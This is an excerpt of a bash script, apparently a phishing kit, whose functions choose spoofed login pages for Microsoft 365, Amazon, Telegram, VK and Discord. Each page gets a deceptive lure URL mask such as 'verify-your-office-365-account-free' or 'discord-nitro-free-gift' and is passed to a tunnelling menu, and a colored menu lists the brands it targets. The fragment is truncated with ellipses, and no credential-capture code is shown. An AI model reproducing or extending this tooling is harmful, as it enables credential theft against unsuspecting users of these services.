...
## Microsoft 365
site_microsoft() {
	website="microsoft365"
	mask='https://verify-your-office-365-account-free'
	tunnel_menu
}
...
site_amazon() {
	website="amazon"
	mask='https://amazon-payment-verification-required'
	tunnel_menu
}
...
site_telegram() {
	website="telegram"
	mask='https://telegram-web-login-secure'
	tunnel_menu
}
...
site_vk() {
	website="vk"
	mask='https://vk-security-check-required'
	tunnel_menu
}
...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${CYAN} Facebook      ${RED}[${WHITE}07${RED}]${CYAN} Microsoft 365
		${RED}[${WHITE}02${RED}]${CYAN} Instagram     ${RED}[${WHITE}08${RED}]${CYAN} Amazon
		${RED}[${WHITE}03${RED}]${CYAN} Google        ${RED}[${WHITE}09${RED}]${CYAN} Telegram
		${RED}[${WHITE}04${RED}]${CYAN} Paypal        ${RED}[${WHITE}10${RED}]${CYAN} VK (VKontakte)
		${RED}[${WHITE}05${RED}]${CYAN} Tiktok        ${RED}[${WHITE}11${RED}]${CYAN} Discord
		${RED}[${WHITE}06${RED}]${CYAN} Github
	...
	case $REPLY in 
		...
		11 | 11)
			website="discord"
			mask='https://discord-nitro-free-gift'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
